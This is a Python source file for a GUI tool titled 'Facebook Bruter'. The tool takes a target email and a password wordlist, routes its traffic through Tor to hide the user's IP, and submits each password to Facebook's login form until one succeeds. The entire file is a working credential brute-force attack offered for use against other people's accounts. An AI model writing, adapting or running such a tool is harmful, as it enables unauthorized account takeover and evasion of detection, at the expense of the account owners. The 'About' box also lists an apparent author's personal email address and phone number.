from robobrowser import RoboBrowser
import socket
import socks #From PySocks and Requer win_inet_pton
import requests
import threading
from tkinter import *
import tkFileDialog
root = Tk()
root.title("Facebook Bruter")

def connect_tor():
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050,True)
    socket.socket = socks.socksocket
def openfile():
    global a
    a = tkFileDialog.askopenfilename()
    text2 = '[+]You Select file is {0}'.format(a)
    Label(root,text=text2,fg='green',bg='black').grid(column=1,row=3)

def main():
  global a
  global dead
  global Email
  dead = True
  try:
     connect_tor()
     email =  Email.get()
     start= '-----------BruteForceStarting-------------\n'
     print start
     Label(root,text=start).grid(column=1,row=7)
     browser = RoboBrowser(parser='html.parser')
     browser.open('https://www.facebook.com/login')
     form = browser.get_form()
     form['email'] = email


     with open(a) as files:
        read_file = files.readlines()
        for x in read_file:
           form['pass']= x
           browser.submit_form(form)
           if str(browser.url) == 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100':
                ip = requests.get('https://api.ipify.org/?format=json')
                ip_full = ip.text
                print ip_full
                trying = '[$]Trying ---->{0}'.format(x)
                print trying
                Label(root,text=trying).grid(column=1,row=9)
                Label(root,text=ip_full).grid(column=1,row=8)
           else:
                succ = '#########################'
                succ = '[+]Success==>{0}'.format(x)
                succ =  '#########################'
                print succ
                a = '[+]Success==>{0}'.format(x)
                labal = Label(root,text=succ,bg='black',fg='green').grid(column=1,row=7)
                break
  except:
     labal = Label(root,text='[!!]Some Thing Went Wrong Cheak Word List or Tor Proxy ',bg='black',fg='red').pack()
     print "[!!]Some Thing Went Wrong Cheak Word List or Tor Proxy "
  dead = False
def about():
    root1 = Tk()
    root1.title("About")
    level  = Label(root1,text='''

                       [+] Md Rafsan jani Made Facebook Bruteforcer By Tor Curcit
                       [+] Gmail : shazidno123@gmail.com
                       [+] Mobile : 01818144463

    ''').pack()

def temp():
    global t1
    global dead
    dead = threading.Thread(target=main).start()
    if dead == True:
       t1.start()

def gui():
    global t1
    global Email
    Label(root,text='------------Facebook BruteForcer With Tor Curcite-------------').grid(column=1,row=0)
    Label(root,text='Enter Email or Username').grid(column=1,row=1)
    Email = StringVar()
    Entry(root,textvariable=Email).grid(column=1,row=2)
    Button(root,text='Browse_Pass_file',command=openfile).grid(column=1,row=4)
    t1 = threading.Thread(target=main)
    Button(root,text='Start Attack', command=temp).grid(column=1,row=5)
    Button(root,text='About Author',command=about).grid(column=1,row=6)
    root.mainloop()

if __name__ == '__main__':
   gui()



